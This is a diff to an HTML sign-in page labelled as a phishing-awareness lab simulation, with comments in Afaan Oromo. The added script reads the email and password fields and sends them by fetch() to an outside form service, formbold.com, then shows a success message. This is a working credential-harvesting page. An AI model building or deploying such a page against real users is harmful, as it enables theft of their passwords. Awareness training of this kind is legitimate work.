@@ -52,6 +52,12 @@
             font-size: 12px;
             font-weight: bold;
         }
+        .alert-success {
+            display: none;
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -60,23 +66,55 @@
     <h2>Woyesa Cybersecurity Lab</h2>
     <p style="font-size: 14px; color: #555;">Please sign in to continue.</p>
     
-    <!-- Liinkii FormBold kee as keessa galeera -->
-    <form action="https://formbold.com" method="POST">
+    <form id="phishing-form">
         <div class="input-group">
             <label>Email Address</label>
-            <input type="email" name="email" placeholder="example@gmail.com" required>
+            <input type="email" id="email" placeholder="example@gmail.com" required>
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" name="password" placeholder="Enter your password" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
         </div>
         <button type="submit">Sign In</button>
     </form>
+
+    <div id="success-msg" class="alert-success">
+        ⚠️ Simulation complete! Data sent to lab environment securely.
+    </div>
 
     <div class="warning-text">
         ⚠️ LAB SIMULATION ONLY: This is a cyber security awareness environment. Do not use real credentials.
     </div>
 </div>
+
+<script>
+document.getElementById('phishing-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    var emailData = document.getElementById('email').value;
+    var passwordData = document.getElementById('password').value;
+    
+    // AJAX fayyadamnee FormBold-f ergaa jirra (Fuulli akka hin dogoggorreef)
+    fetch("https://formbold.com", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: new URLSearchParams({
+            "email": emailData,
+            "password": passwordData
+        })
+    })
+    .then(response => {
+        // Erga dhufee booda unka dhoksina, ergaa milkaa'inaa argisiisna
+        document.getElementById('phishing-form').style.display = 'none';
+        document.getElementById('success-msg').style.display = 'block';
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+});
+</script>
 
 </body>
 </html>
